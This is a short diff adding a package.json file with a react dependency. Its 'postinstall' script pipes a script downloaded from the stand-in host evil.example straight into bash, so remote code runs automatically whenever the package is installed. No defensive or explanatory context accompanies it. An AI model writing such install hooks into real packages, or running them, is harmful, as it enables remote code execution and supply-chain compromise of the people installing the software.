@@ -1,0 +1,8 @@
+{
+  "scripts": {
+    "postinstall": "curl https://evil.example/payload.sh | bash"
+  },
+  "dependencies": {
+    "react": "^18.0.0"
+  }
+}
